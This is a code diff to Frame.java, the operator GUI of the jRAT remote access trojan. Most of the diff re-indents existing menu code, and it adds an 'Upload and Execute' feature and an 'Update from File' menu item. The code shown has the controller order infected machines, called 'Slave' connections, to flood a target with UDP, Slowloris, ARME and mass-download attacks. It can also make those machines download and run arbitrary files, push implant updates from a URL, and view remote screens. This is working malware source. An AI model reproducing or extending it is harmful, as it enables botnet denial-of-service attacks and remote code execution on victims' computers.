@@ -92,6 +92,7 @@ import su.jrat.client.utils.NetUtils;
 import su.jrat.client.utils.Utils;
 import su.jrat.common.Flood;
 import su.jrat.common.Version;
+import su.jrat.common.downloadable.Downloadable;
 import su.jrat.common.utils.IOUtils;
 
 @SuppressWarnings({ "serial" })
@@ -202,47 +203,47 @@ public class Frame extends BaseFrame {
 		mntmClientSettings.setIcon(new ImageIcon(Frame.class.getResource("/icons/toolbox.png")));
 		mnMain.add(mntmClientSettings);
 		mnMain.addSeparator();
-		
+
 		JMenu mnShow = new JMenu("Show");
 		mnMain.add(mnShow);
-		
-				JCheckBoxMenuItem chckbxmntmShowToolbar = new JCheckBoxMenuItem("Show Toolbar");
-				mnShow.add(chckbxmntmShowToolbar);
-				chckbxmntmShowToolbar.setIcon(new ImageIcon(Frame.class.getResource("/icons/toolbar.png")));
-				
-						JCheckBoxMenuItem mntmShowThumbnails = new JCheckBoxMenuItem("Show Thumbnails");
-						mnShow.add(mntmShowThumbnails);
-						mntmShowThumbnails.addActionListener(new ActionListener() {
-							public void actionPerformed(ActionEvent arg0) {
-								thumbnails = !thumbnails;
 
-								if (thumbnails) {
-									for (int i = 0; i < Main.connections.size(); i++) {
-										Slave sl = Main.connections.get(i);
-										if (sl.getThumbnail() == null) {
-											sl.addToSendQueue(new Packet40Thumbnail());
-										} else {
-											int row = Utils.getRow(sl);
-											mainModel.setValueAt(sl.getThumbnail(), row, 0);
-										}
-									}
-									mainTable.setRowHeight(100);
-								} else {
-									mainTable.setRowHeight(30);
-									for (int i = 0; i < Main.connections.size(); i++) {
-										Slave sl = Main.connections.get(i);
-										int row = Utils.getRow(sl);
-										mainModel.setValueAt(sl.getCountry(), row, 0);
-									}
-								}
-							}
-						});
-						mntmShowThumbnails.setIcon(new ImageIcon(Frame.class.getResource("/icons/image.png")));
-				chckbxmntmShowToolbar.addActionListener(new ActionListener() {
-					public void actionPerformed(ActionEvent arg0) {
-						toolBar.setVisible(((JCheckBoxMenuItem) arg0.getSource()).isSelected());
+		JCheckBoxMenuItem chckbxmntmShowToolbar = new JCheckBoxMenuItem("Show Toolbar");
+		mnShow.add(chckbxmntmShowToolbar);
+		chckbxmntmShowToolbar.setIcon(new ImageIcon(Frame.class.getResource("/icons/toolbar.png")));
+
+		JCheckBoxMenuItem mntmShowThumbnails = new JCheckBoxMenuItem("Show Thumbnails");
+		mnShow.add(mntmShowThumbnails);
+		mntmShowThumbnails.addActionListener(new ActionListener() {
+			public void actionPerformed(ActionEvent arg0) {
+				thumbnails = !thumbnails;
+
+				if (thumbnails) {
+					for (int i = 0; i < Main.connections.size(); i++) {
+						Slave sl = Main.connections.get(i);
+						if (sl.getThumbnail() == null) {
+							sl.addToSendQueue(new Packet40Thumbnail());
+						} else {
+							int row = Utils.getRow(sl);
+							mainModel.setValueAt(sl.getThumbnail(), row, 0);
+						}
 					}
-				});
+					mainTable.setRowHeight(100);
+				} else {
+					mainTable.setRowHeight(30);
+					for (int i = 0; i < Main.connections.size(); i++) {
+						Slave sl = Main.connections.get(i);
+						int row = Utils.getRow(sl);
+						mainModel.setValueAt(sl.getCountry(), row, 0);
+					}
+				}
+			}
+		});
+		mntmShowThumbnails.setIcon(new ImageIcon(Frame.class.getResource("/icons/image.png")));
+		chckbxmntmShowToolbar.addActionListener(new ActionListener() {
+			public void actionPerformed(ActionEvent arg0) {
+				toolBar.setVisible(((JCheckBoxMenuItem) arg0.getSource()).isSelected());
+			}
+		});
 
 		mnMain.addSeparator();
 
@@ -270,88 +271,88 @@ public class Frame extends BaseFrame {
 		});
 		mntmAdvancedBuild.setIcon(new ImageIcon(Frame.class.getResource("/icons/information-button.png")));
 		mnServerModule.add(mntmAdvancedBuild);
-		
+
 		mnServerModule.addSeparator();
-		
-				JMenuItem mntmPlugins = new JMenuItem("Plugins");
-				mnServerModule.add(mntmPlugins);
-				mntmPlugins.addActionListener(new ActionListener() {
-					public void actionPerformed(ActionEvent arg0) {
-						FramePlugins frame = new FramePlugins();
-						frame.setVisible(true);
-					}
-				});
-				mntmPlugins.setIcon(new ImageIcon(Frame.class.getResource("/icons/plugin.png")));
-		
+
+		JMenuItem mntmPlugins = new JMenuItem("Plugins");
+		mnServerModule.add(mntmPlugins);
+		mntmPlugins.addActionListener(new ActionListener() {
+			public void actionPerformed(ActionEvent arg0) {
+				FramePlugins frame = new FramePlugins();
+				frame.setVisible(true);
+			}
+		});
+		mntmPlugins.setIcon(new ImageIcon(Frame.class.getResource("/icons/plugin.png")));
+
 		JMenu mnKeys = new JMenu("Keys");
 		mnMain.add(mnKeys);
-				
-				JMenuItem mntmImportKey = new JMenuItem("Import key");
-				mnKeys.add(mntmImportKey);
-				mntmImportKey.addActionListener(new ActionListener() {
-					public void actionPerformed(ActionEvent arg0) {
-						JFileChooser chooser = new JFileChooser();
-						chooser.showOpenDialog(null);
-						
-						File file = chooser.getSelectedFile();
-						
-						if (file != null) {
-							try {
-								FileInputStream fis = new FileInputStream(file);
-								FileOutputStream fos = new FileOutputStream(new File(Globals.getFileDirectory(), "jrat.key"));
-								IOUtils.copy(fis, fos);
-								fis.close();
-								fos.close();
-								
-								JOptionPane.showMessageDialog(null, "Imported key, please restart", "Import key", JOptionPane.WARNING_MESSAGE);
-							} catch (Exception ex) {
-								ex.printStackTrace();
-								ErrorDialog.create(ex);
-							}
-						}
-					}
-				});
-				mntmImportKey.setIcon(new ImageIcon(Frame.class.getResource("/icons/key_arrow.png")));
-		
-				JMenuItem mntmGenerateKey = new JMenuItem("Generate key");
-				mnKeys.add(mntmGenerateKey);
-				mntmGenerateKey.addActionListener(new ActionListener() {
-					public void actionPerformed(ActionEvent arg0) {
-						try {
-							File keyFile;
-							
-							int i = 0;
-							
-							do {
-								i++;
-								String s = i == 0 ? "" : Integer.toString(i);
-								keyFile = Globals.getKeyFile(s);
-							} while (keyFile.exists());
 
-							FileOutputStream out = new FileOutputStream(keyFile);
-							out.write(UniqueId.generateBinary());
-							out.close();
+		JMenuItem mntmImportKey = new JMenuItem("Import key");
+		mnKeys.add(mntmImportKey);
+		mntmImportKey.addActionListener(new ActionListener() {
+			public void actionPerformed(ActionEvent arg0) {
+				JFileChooser chooser = new JFileChooser();
+				chooser.showOpenDialog(null);
 
-							JOptionPane.showMessageDialog(null, "Generated a new key to jrat.key\nBackup this file and do not loose it", "Generate key", JOptionPane.INFORMATION_MESSAGE);
-						} catch (Exception ex) {
-							ex.printStackTrace();
-							ErrorDialog.create(ex);
-						}
+				File file = chooser.getSelectedFile();
+
+				if (file != null) {
+					try {
+						FileInputStream fis = new FileInputStream(file);
+						FileOutputStream fos = new FileOutputStream(new File(Globals.getFileDirectory(), "jrat.key"));
+						IOUtils.copy(fis, fos);
+						fis.close();
+						fos.close();
+
+						JOptionPane.showMessageDialog(null, "Imported key, please restart", "Import key", JOptionPane.WARNING_MESSAGE);
+					} catch (Exception ex) {
+						ex.printStackTrace();
+						ErrorDialog.create(ex);
 					}
-				});
-				mntmGenerateKey.setIcon(new ImageIcon(Frame.class.getResource("/icons/key_plus.png")));
-		
+				}
+			}
+		});
+		mntmImportKey.setIcon(new ImageIcon(Frame.class.getResource("/icons/key_arrow.png")));
+
+		JMenuItem mntmGenerateKey = new JMenuItem("Generate key");
+		mnKeys.add(mntmGenerateKey);
+		mntmGenerateKey.addActionListener(new ActionListener() {
+			public void actionPerformed(ActionEvent arg0) {
+				try {
+					File keyFile;
+
+					int i = 0;
+
+					do {
+						i++;
+						String s = i == 0 ? "" : Integer.toString(i);
+						keyFile = Globals.getKeyFile(s);
+					} while (keyFile.exists());
+
+					FileOutputStream out = new FileOutputStream(keyFile);
+					out.write(UniqueId.generateBinary());
+					out.close();
+
+					JOptionPane.showMessageDialog(null, "Generated a new key to jrat.key\nBackup this file and do not loose it", "Generate key", JOptionPane.INFORMATION_MESSAGE);
+				} catch (Exception ex) {
+					ex.printStackTrace();
+					ErrorDialog.create(ex);
+				}
+			}
+		});
+		mntmGenerateKey.setIcon(new ImageIcon(Frame.class.getResource("/icons/key_plus.png")));
+
 		JMenu mnHelp = new JMenu("Help");
 		mnMain.add(mnHelp);
-		
-				JMenuItem mntmEulamustRead = new JMenuItem("EULA (Must read)");
-				mnHelp.add(mntmEulamustRead);
-				mntmEulamustRead.addActionListener(new ActionListener() {
-					public void actionPerformed(ActionEvent arg0) {
-						DialogEula frame = new DialogEula(true);
-						frame.setVisible(true);
-					}
-				});
+
+		JMenuItem mntmEulamustRead = new JMenuItem("EULA (Must read)");
+		mnHelp.add(mntmEulamustRead);
+		mntmEulamustRead.addActionListener(new ActionListener() {
+			public void actionPerformed(ActionEvent arg0) {
+				DialogEula frame = new DialogEula(true);
+				frame.setVisible(true);
+			}
+		});
 		mntmEulamustRead.setIcon(new ImageIcon(Frame.class.getResource("/icons/gavel.png")));
 
 		JMenuItem mntmAProblemShow = new JMenuItem("A problem? Show help");
@@ -363,7 +364,7 @@ public class Frame extends BaseFrame {
 			}
 		});
 		mntmAProblemShow.setIcon(new ImageIcon(Frame.class.getResource("/icons/information-button.png")));
-		
+
 		JMenuItem mntmTwitter = new JMenuItem("Twitter");
 		mntmTwitter.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
@@ -374,7 +375,7 @@ public class Frame extends BaseFrame {
 		mnMain.add(mntmTwitter);
 
 		mnMain.addSeparator();
-		
+
 		JMenuItem mntmExit = new JMenuItem("Exit");
 		mntmExit.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
@@ -395,7 +396,7 @@ public class Frame extends BaseFrame {
 		if (!Main.trial) {
 			mnMain.add(mntmBrowsePlugins);
 		}
-		
+
 		JMenuItem mntmUpdate = new JMenuItem("Update");
 		mntmUpdate.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
@@ -980,224 +981,255 @@ public class Frame extends BaseFrame {
 
 		scrollPane.setViewportView(mainTable);
 		addPopup(mainTable, popupMenu);
-		
-				JMenu mnNetworking = new JMenu("Networking");
-				mnNetworking.setIcon(new ImageIcon(Frame.class.getResource("/icons/process_no.png")));
-				popupMenu.add(mnNetworking);
+
+		JMenu mnNetworking = new JMenu("Networking");
+		mnNetworking.setIcon(new ImageIcon(Frame.class.getResource("/icons/process_no.png")));
+		popupMenu.add(mnNetworking);
+
+		JMenu mnStressing = new JMenu("Stressing");
+		mnStressing.setIcon(new ImageIcon(Frame.class.getResource("/icons/http_flood.png")));
+		mnNetworking.add(mnStressing);
+
+		JMenuItem mntmUdpFlood = new JMenuItem("UDP");
+		mnStressing.add(mntmUdpFlood);
+		mntmUdpFlood.addActionListener(new ActionListener() {
+			public void actionPerformed(ActionEvent arg0) {
+				String target = Utils.showDialog("UDP flood", "Enter IP:Port to flood");
+				if (target == null) {
+					return;
+				}
+				try {
+					String[] targetargs = target.split(":");
+					Integer.parseInt(targetargs[1]);
+				} catch (Exception ex) {
+					JOptionPane.showMessageDialog(null, "Enter valid IP:Port!", "Error", JOptionPane.ERROR_MESSAGE);
+					return;
+				}
+				String time = Utils.showDialog("UDP flood", "Enter seconds to flood");
+				if (time == null) {
+					return;
+				}
+				int time1;
+				try {
+					time1 = Integer.parseInt(time);
+				} catch (Exception ex) {
+					JOptionPane.showMessageDialog(null, "Enter valid seconds as number!", "Error", JOptionPane.ERROR_MESSAGE);
+					return;
+				}
+				List<Slave> servers = Utils.getSlaves();
+				if (servers.size() > 0) {
+					for (Slave sl : servers) {
+						sl.addToSendQueue(new Packet22Flood(Flood.UDP, target, time1));
+					}
+				}
+			}
+		});
+		mntmUdpFlood.setIcon(null);
+
+		JMenuItem mntmMassDownloadFlood = new JMenuItem("Mass download");
+		mnStressing.add(mntmMassDownloadFlood);
+		mntmMassDownloadFlood.addActionListener(new ActionListener() {
+			public void actionPerformed(ActionEvent arg0) {
+				String target = Utils.showDialog("Mass download flood", "Enter website URL to download");
+				if (target == null) {
+					return;
+				}
+
+				String time = Utils.showDialog("Mass download flood", "Enter seconds to download");
+				if (time == null) {
+					return;
+				}
+				int time1;
+				try {
+					time1 = Integer.parseInt(time);
+				} catch (Exception ex) {
+					JOptionPane.showMessageDialog(null, "Enter valid seconds as number!", "Error", JOptionPane.ERROR_MESSAGE);
+					return;
+				}
+				List<Slave> servers = Utils.getSlaves();
+				if (servers.size() > 0) {
+					for (Slave sl : servers) {
+						sl.addToSendQueue(new Packet22Flood(Flood.DRAIN, target, time1));
+					}
+				}
+			}
+		});
+		mntmMassDownloadFlood.setIcon(null);
+
+		JMenuItem mntmArme = new JMenuItem("ARME");
+		mnStressing.add(mntmArme);
+		mntmArme.addActionListener(new ActionListener() {
+			public void actionPerformed(ActionEvent arg0) {
+				String target = Utils.showDialog("ARME flood", "Enter Host:Port/IP:Port to flood");
+				if (target == null) {
+					return;
+				}
+				try {
+					String[] targetargs = target.split(":");
+					Integer.parseInt(targetargs[1]);
+				} catch (Exception ex) {
+					JOptionPane.showMessageDialog(null, "Enter valid IP:Port!", "Error", JOptionPane.ERROR_MESSAGE);
+					return;
+				}
+				String time = Utils.showDialog("ARME flood", "Enter seconds to flood");
+				if (time == null) {
+					return;
+				}
+				int time1;
+				try {
+					time1 = Integer.parseInt(time);
+				} catch (Exception ex) {
+					JOptionPane.showMessageDialog(null, "Enter valid seconds as number!", "Error", JOptionPane.ERROR_MESSAGE);
+					return;
+				}
+				List<Slave> servers = Utils.getSlaves();
+				if (servers.size() > 0) {
+					for (Slave sl : servers) {
+						sl.addToSendQueue(new Packet22Flood(Flood.ARME, target, time1));
+					}
+				}
+			}
+		});
+		mntmArme.setIcon(null);
+
+		JMenuItem mntmSlowloris = new JMenuItem("Slowloris");
+		mntmSlowloris.addActionListener(new ActionListener() {
+			public void actionPerformed(ActionEvent arg0) {
+				String target = Utils.showDialog("Slowloris flood", "Enter Host:Port/IP:Port to flood");
+				if (target == null) {
+					return;
+				}
+				try {
+					String[] targetargs = target.split(":");
+					Integer.parseInt(targetargs[1]);
+				} catch (Exception ex) {
+					JOptionPane.showMessageDialog(null, "Enter valid IP:Port!", "Error", JOptionPane.ERROR_MESSAGE);
+					return;
+				}
+				String time = Utils.showDialog("Slowloris flood", "Enter seconds to flood");
+				if (time == null) {
+					return;
+				}
+				int time1;
+				try {
+					time1 = Integer.parseInt(time);
+				} catch (Exception ex) {
+					JOptionPane.showMessageDialog(null, "Enter valid seconds as number!", "Error", JOptionPane.ERROR_MESSAGE);
+					return;
+				}
+				List<Slave> servers = Utils.getSlaves();
+				if (servers.size() > 0) {
+					for (Slave sl : servers) {
+						sl.addToSendQueue(new Packet22Flood(Flood.SLOWLORIS, target, time1));
+					}
+				}
+			}
+		});
+		mnStressing.add(mntmSlowloris);
+
+		mnNetworking.addSeparator();
+
+		JMenuItem mntmexe = new JMenuItem("Download and Execute");
+		mnNetworking.add(mntmexe);
+		mntmexe.setIcon(new ImageIcon(Frame.class.getResource("/icons/down_arrow.png")));
+
+		JMenuItem mntmUploadAndExecute = new JMenuItem("Upload and Execute");
+		mntmUploadAndExecute.addActionListener(new ActionListener() {
+			public void actionPerformed(ActionEvent arg0) {
+				List<Slave> servers = Utils.getSlaves();
+				if (servers.size() > 0) {
+					JFileChooser f = new JFileChooser();
+					f.showOpenDialog(null);
 				
-				JMenu mnStressing = new JMenu("Stressing");
-				mnStressing.setIcon(new ImageIcon(Frame.class.getResource("/icons/http_flood.png")));
-				mnNetworking.add(mnStressing);
-				
-						JMenuItem mntmUdpFlood = new JMenuItem("UDP");
-						mnStressing.add(mntmUdpFlood);
-						mntmUdpFlood.addActionListener(new ActionListener() {
-							public void actionPerformed(ActionEvent arg0) {
-								String target = Utils.showDialog("UDP flood", "Enter IP:Port to flood");
-								if (target == null) {
-									return;
-								}
-								try {
-									String[] targetargs = target.split(":");
-									Integer.parseInt(targetargs[1]);
-								} catch (Exception ex) {
-									JOptionPane.showMessageDialog(null, "Enter valid IP:Port!", "Error", JOptionPane.ERROR_MESSAGE);
-									return;
-								}
-								String time = Utils.showDialog("UDP flood", "Enter seconds to flood");
-								if (time == null) {
-									return;
-								}
-								int time1;
-								try {
-									time1 = Integer.parseInt(time);
-								} catch (Exception ex) {
-									JOptionPane.showMessageDialog(null, "Enter valid seconds as number!", "Error", JOptionPane.ERROR_MESSAGE);
-									return;
-								}
-								List<Slave> servers = Utils.getSlaves();
-								if (servers.size() > 0) {
-									for (Slave sl : servers) {
-										sl.addToSendQueue(new Packet22Flood(Flood.UDP, target, time1));
-									}
-								}
-							}
-						});
-						mntmUdpFlood.setIcon(null);
-						
-								JMenuItem mntmMassDownloadFlood = new JMenuItem("Mass download");
-								mnStressing.add(mntmMassDownloadFlood);
-								mntmMassDownloadFlood.addActionListener(new ActionListener() {
-									public void actionPerformed(ActionEvent arg0) {
-										String target = Utils.showDialog("Mass download flood", "Enter website URL to download");
-										if (target == null) {
-											return;
-										}
+					File file = f.getSelectedFile();
 
-										String time = Utils.showDialog("Mass download flood", "Enter seconds to download");
-										if (time == null) {
-											return;
-										}
-										int time1;
-										try {
-											time1 = Integer.parseInt(time);
-										} catch (Exception ex) {
-											JOptionPane.showMessageDialog(null, "Enter valid seconds as number!", "Error", JOptionPane.ERROR_MESSAGE);
-											return;
-										}
-										List<Slave> servers = Utils.getSlaves();
-										if (servers.size() > 0) {
-											for (Slave sl : servers) {
-												sl.addToSendQueue(new Packet22Flood(Flood.DRAIN, target, time1));
-											}
-										}
-									}
-								});
-								mntmMassDownloadFlood.setIcon(null);
-								
-										JMenuItem mntmArme = new JMenuItem("ARME");
-										mnStressing.add(mntmArme);
-										mntmArme.addActionListener(new ActionListener() {
-											public void actionPerformed(ActionEvent arg0) {
-												String target = Utils.showDialog("ARME flood", "Enter Host:Port/IP:Port to flood");
-												if (target == null) {
-													return;
-												}
-												try {
-													String[] targetargs = target.split(":");
-													Integer.parseInt(targetargs[1]);
-												} catch (Exception ex) {
-													JOptionPane.showMessageDialog(null, "Enter valid IP:Port!", "Error", JOptionPane.ERROR_MESSAGE);
-													return;
-												}
-												String time = Utils.showDialog("ARME flood", "Enter seconds to flood");
-												if (time == null) {
-													return;
-												}
-												int time1;
-												try {
-													time1 = Integer.parseInt(time);
-												} catch (Exception ex) {
-													JOptionPane.showMessageDialog(null, "Enter valid seconds as number!", "Error", JOptionPane.ERROR_MESSAGE);
-													return;
-												}
-												List<Slave> servers = Utils.getSlaves();
-												if (servers.size() > 0) {
-													for (Slave sl : servers) {
-														sl.addToSendQueue(new Packet22Flood(Flood.ARME, target, time1));
-													}
-												}
-											}
-										});
-										mntmArme.setIcon(null);
-										
-										JMenuItem mntmSlowloris = new JMenuItem("Slowloris");
-										mntmSlowloris.addActionListener(new ActionListener() {
-											public void actionPerformed(ActionEvent arg0) {
-												String target = Utils.showDialog("Slowloris flood", "Enter Host:Port/IP:Port to flood");
-												if (target == null) {
-													return;
-												}
-												try {
-													String[] targetargs = target.split(":");
-													Integer.parseInt(targetargs[1]);
-												} catch (Exception ex) {
-													JOptionPane.showMessageDialog(null, "Enter valid IP:Port!", "Error", JOptionPane.ERROR_MESSAGE);
-													return;
-												}
-												String time = Utils.showDialog("Slowloris flood", "Enter seconds to flood");
-												if (time == null) {
-													return;
-												}
-												int time1;
-												try {
-													time1 = Integer.parseInt(time);
-												} catch (Exception ex) {
-													JOptionPane.showMessageDialog(null, "Enter valid seconds as number!", "Error", JOptionPane.ERROR_MESSAGE);
-													return;
-												}
-												List<Slave> servers = Utils.getSlaves();
-												if (servers.size() > 0) {
-													for (Slave sl : servers) {
-														sl.addToSendQueue(new Packet22Flood(Flood.SLOWLORIS, target, time1));
-													}
-												}
-											}
-										});
-										mnStressing.add(mntmSlowloris);
-										
-												JMenuItem mntmexe = new JMenuItem("Download and Execute");
-												mnNetworking.add(mntmexe);
-												mntmexe.setIcon(new ImageIcon(Frame.class.getResource("/icons/down_arrow.png")));
-												
-														JMenuItem mntmUpdateFromUrl = new JMenuItem("Update from URL");
-														mnNetworking.add(mntmUpdateFromUrl);
-														mntmUpdateFromUrl.setIcon(new ImageIcon(Frame.class.getResource("/icons/update.png")));
-														
-																JMenuItem mntmHost = new JMenuItem("Host");
-																mnNetworking.add(mntmHost);
-																mntmHost.setIcon(new ImageIcon(Frame.class.getResource("/icons/computer_info.png")));
-																mntmHost.addActionListener(new ActionListener() {
-																	public void actionPerformed(ActionEvent arg0) {
-																		Slave slave = Utils.getSlave(mainModel.getValueAt(mainTable.getSelectedRow(), 3).toString());
-																		if (slave != null) {
-																			JOptionPane.showMessageDialog(null, slave.getHost(), "Host - " + slave.getIP(), JOptionPane.INFORMATION_MESSAGE);
-																		}
-																	}
-																});
-																mntmUpdateFromUrl.addActionListener(new ActionListener() {
-																	public void actionPerformed(ActionEvent arg0) {
-																		List<Slave> servers = Utils.getSlaves();
-																		if (servers.size() > 0) {
-																			String result = Utils.showDialog("Update from URL", "Input URL to update with");
-																			if (result == null) {
-																				return;
-																			}
-																			try {
-																				URLParser.parse(result);
-																			} catch (Exception ex) {
-																				JOptionPane.showMessageDialog(null, "Input valid URL!", "Update from URL", JOptionPane.ERROR_MESSAGE);
-																				return;
-																			}
+					if (file == null) {
+						return;
+					}
 
-																			result = result.trim().replace(" ", "%20");
+					for (Slave slave : servers) {
+						slave.addToSendQueue(new Packet17DownloadExecute("", Downloadable.getFileExtension(file.getName()), file));
+					}
+				}
+			}
+		});
+		mnNetworking.add(mntmUploadAndExecute);
 
-																			for (Slave sl : servers) {
-																				sl.addToSendQueue(new Packet18Update(result));
-																			}
-																		}
-																	}
-																});
-																mntmexe.addActionListener(new ActionListener() {
-																	public void actionPerformed(ActionEvent arg0) {
-																		List<Slave> servers = Utils.getSlaves();
-																		if (servers.size() > 0) {
-																			String result = Utils.showDialog("Download and Execute", "Input URL to download and execute");
-																			if (result == null) {
-																				return;
-																			}
+		mnNetworking.addSeparator();
 
-																			try {
-																				URLParser.parse(result);
-																			} catch (Exception ex) {
-																				JOptionPane.showMessageDialog(null, "Input valid URL!", "Download URL", JOptionPane.ERROR_MESSAGE);
-																				return;
-																			}
+		JMenuItem mntmUpdateFromUrl = new JMenuItem("Update from URL");
+		mnNetworking.add(mntmUpdateFromUrl);
+		mntmUpdateFromUrl.setIcon(new ImageIcon(Frame.class.getResource("/icons/update.png")));
 
-																			result = result.trim().replace(" ", "%20");
+		JMenuItem mntmUpdateFromFile = new JMenuItem("Update from File");
+		mnNetworking.add(mntmUpdateFromFile);
 
-																			String filetype = DialogFileType.showDialog();
+		mnNetworking.addSeparator();
 
-																			if (filetype == null) {
-																				return;
-																			}
+		JMenuItem mntmHost = new JMenuItem("Host");
+		mnNetworking.add(mntmHost);
+		mntmHost.setIcon(new ImageIcon(Frame.class.getResource("/icons/computer_info.png")));
+		mntmHost.addActionListener(new ActionListener() {
+			public void actionPerformed(ActionEvent arg0) {
+				Slave slave = Utils.getSlave(mainModel.getValueAt(mainTable.getSelectedRow(), 3).toString());
+				if (slave != null) {
+					JOptionPane.showMessageDialog(null, slave.getHost(), "Host - " + slave.getIP(), JOptionPane.INFORMATION_MESSAGE);
+				}
+			}
+		});
+		mntmUpdateFromUrl.addActionListener(new ActionListener() {
+			public void actionPerformed(ActionEvent arg0) {
+				List<Slave> servers = Utils.getSlaves();
+				if (servers.size() > 0) {
+					String result = Utils.showDialog("Update from URL", "Input URL to update with");
+					if (result == null) {
+						return;
+					}
+					try {
+						URLParser.parse(result);
+					} catch (Exception ex) {
+						JOptionPane.showMessageDialog(null, "Input valid URL!", "Update from URL", JOptionPane.ERROR_MESSAGE);
+						return;
+					}
 
-																			for (Slave slave : servers) {
-																				slave.addToSendQueue(new Packet17DownloadExecute(result, filetype));
-																			}
-																		}
-																	}
-																});
+					result = result.trim().replace(" ", "%20");
+
+					for (Slave sl : servers) {
+						sl.addToSendQueue(new Packet18Update(result));
+					}
+				}
+			}
+		});
+		mntmexe.addActionListener(new ActionListener() {
+			public void actionPerformed(ActionEvent arg0) {
+				List<Slave> servers = Utils.getSlaves();
+				if (servers.size() > 0) {
+					String result = Utils.showDialog("Download and Execute", "Input URL to download and execute");
+					if (result == null) {
+						return;
+					}
+
+					try {
+						URLParser.parse(result);
+					} catch (Exception ex) {
+						JOptionPane.showMessageDialog(null, "Input valid URL!", "Download URL", JOptionPane.ERROR_MESSAGE);
+						return;
+					}
+
+					result = result.trim().replace(" ", "%20");
+
+					String filetype = DialogFileType.showDialog();
+
+					if (filetype == null) {
+						return;
+					}
+
+					for (Slave slave : servers) {
+						slave.addToSendQueue(new Packet17DownloadExecute(result, filetype));
+					}
+				}
+			}
+		});
 
 		JMenu mnQuickOpen = new JMenu("Quick Open");
 		mnQuickOpen.setIcon(new ImageIcon(Frame.class.getResource("/icons/window_import.png")));
@@ -1212,36 +1244,36 @@ public class Frame extends BaseFrame {
 				}
 			}
 		});
-		
-				JMenuItem mntmVisitUrl = new JMenuItem("Visit URL");
-				mnQuickOpen.add(mntmVisitUrl);
-				mntmVisitUrl.addActionListener(new ActionListener() {
-					public void actionPerformed(ActionEvent arg0) {
-						List<Slave> servers = Utils.getSlaves();
-						if (servers.size() > 0) {
-							String result = Utils.showDialog("Visit URL", "Input URL to visit");
-							if (result != null && !result.startsWith("http://")) {
-								result = "http://" + result;
-							}
-							if (result == null) {
-								return;
-							}
 
-							if (!result.startsWith("http://")) {
-								JOptionPane.showMessageDialog(null, "Input valid URL!", "Visit URL", JOptionPane.ERROR_MESSAGE);
-								return;
-							}
-
-							result = result.trim();
-
-							for (Slave slave : servers) {
-								slave.addToSendQueue(new Packet14VisitURL(result));
-							}
-						}
-
+		JMenuItem mntmVisitUrl = new JMenuItem("Visit URL");
+		mnQuickOpen.add(mntmVisitUrl);
+		mntmVisitUrl.addActionListener(new ActionListener() {
+			public void actionPerformed(ActionEvent arg0) {
+				List<Slave> servers = Utils.getSlaves();
+				if (servers.size() > 0) {
+					String result = Utils.showDialog("Visit URL", "Input URL to visit");
+					if (result != null && !result.startsWith("http://")) {
+						result = "http://" + result;
 					}
-				});
-				mntmVisitUrl.setIcon(new ImageIcon(Frame.class.getResource("/icons/window_browser.png")));
+					if (result == null) {
+						return;
+					}
+
+					if (!result.startsWith("http://")) {
+						JOptionPane.showMessageDialog(null, "Input valid URL!", "Visit URL", JOptionPane.ERROR_MESSAGE);
+						return;
+					}
+
+					result = result.trim();
+
+					for (Slave slave : servers) {
+						slave.addToSendQueue(new Packet14VisitURL(result));
+					}
+				}
+
+			}
+		});
+		mntmVisitUrl.setIcon(new ImageIcon(Frame.class.getResource("/icons/window_browser.png")));
 		mntmRemoteScreen.setIcon(new ImageIcon(Frame.class.getResource("/icons/screen.png")));
 		mnQuickOpen.add(mntmRemoteScreen);
 
